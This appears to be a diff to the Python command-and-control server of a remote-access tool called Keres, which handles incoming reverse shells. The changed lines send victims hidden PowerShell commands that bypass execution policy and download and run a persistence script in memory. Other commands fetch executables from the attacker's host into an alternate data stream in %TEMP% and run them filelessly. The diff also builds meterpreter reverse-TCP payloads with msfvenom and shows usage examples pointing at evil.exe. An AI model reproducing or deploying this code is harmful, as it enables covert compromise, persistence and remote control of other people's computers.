@@ -281,13 +281,13 @@ def persist_shell(conn, addr, shell_id):
     # Replace the server address and port
     ps_script = ps_script.replace('server_address', get_my_ip())
     ps_script = ps_script.replace('port_number', '5555')
-
+    save = open('persist.ps1', 'w')
+    url = f"https://{get_my_ip()}:8443/persist.ps1"
     # Convert the script to a base64 string
-    encoded_ps_script = base64.b64encode(ps_script.encode('utf-16le')).decode()
+    command = f'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex ((iwr -Uri {url}).Content)"'
 
     # Create the PowerShell command
-    command = f'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_ps_script}'
-    print("\033[91m[*] Executing Keres ..... \033[0m")
+    print("\033[91m[*] Executing Keres in memory ..... \033[0m")
     # Execute the command on shell 
     conn.send(command.encode())
     print(f"[*] Persisted shell {shell_id} from IP {addr}")
@@ -298,7 +298,7 @@ def upgrade_shell(conn,addr, shell_id):
     subprocess.run(["msfvenom", "-p", "windows/x64/meterpreter_reverse_tcp", f"lhost={get_my_ip()}", "lport=4444", "-f", "exe", "-o", "./meter/https.exe"])    
     print("\033[91mgenerated meterpreter payload")
     
-    command = f"""cmd /c "cd %TEMP% && IF NOT EXIST curl https://{get_my_ip()}:8585/exec.exe -OJ && exec.exe https://{get_my_ip()}:8585/meter/https.exe EXE" """
+    command = f"""cmd /c "cd %TEMP% && IF NOT EXIST curl https://{get_my_ip()}:8443/exec.exe -OJ && exec.exe https://{get_my_ip()}:8443/meter/https.exe EXE" """
     conn.send(command.encode())
     print("Host : "+get_my_ip() + " Port : 4444")
     time.sleep(2)   
@@ -316,7 +316,7 @@ def exec_shell(conn, addr, shell_id, url, type,func=""):
         func = "--Method " + func
 
     print("\033[94m[*] Executing PE Filelessly in memory on shell {shell_id} from IP {addr}")
-    command = f"""cmd.exe /c  "IF NOT EXIST %TEMP%\sys.m:_.exe curl https://{get_my_ip()}:8585/exec.exe -o %TEMP%\sys.m:_.exe && cd %TEMP% && powershell.exe -windowstyle hidden -c .\sys.m:_.exe {url} {type} {func}" """
+    command = f"""cmd.exe /c  "IF NOT EXIST %TEMP%\sys.m:_.exe curl https://{get_my_ip()}:8443/exec.exe -o %TEMP%\sys.m:_.exe && cd %TEMP% && powershell.exe -windowstyle hidden -c .\sys.m:_.exe {url} {type} {func}" """
     conn.send(command.encode())
     
     time.sleep(2)
@@ -380,9 +380,9 @@ def accept_connections():
         ip_connections = [connection for connection in connections if connection[1][0] == addr[0]]
         if len(ip_connections) < 3:
             connections.append((conn, addr))
-            print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]}', Fore.WHITE)
+            print(Fore.GREEN + '\n[*] Accepted new connection from: ' + Fore.YELLOW + f'{addr[0]}' + Fore.GREEN + f':{addr[1]}' + Fore.WHITE)
         else:
-            print(Fore.RED, f'\n[*] Connection limit reached for: {addr[0]}', Fore.WHITE)
+            print(Fore.RED + '\n[*] Connection limit reached for: ' + Fore.YELLOW + f'{addr[0]}' + Fore.RED + Fore.WHITE)
             conn.close()
 # Create a new thread that will run the accept_connections function
 accept_thread = threading.Thread(target=accept_connections)
@@ -431,8 +431,8 @@ while True:
                     parts = command.split()
                     if len(parts) < 4:
                         print("Invalid command. Usage: exec <id> <url> <TYPE>")
-                        print("example :exec 2 http://payload.com/evil.exe  EXE")
-                        print("example :exec 2 http://payload.com/evil.dll  DLL --Method DLLRegisterServer")
+                        print("example : exec 2 http://payload.com/evil.exe  EXE")
+                        print("example : exec 2 http://payload.com/evil.dll  DLL --Method DLLRegisterServer")
                         continue
 
                     shell_id = parts[1]
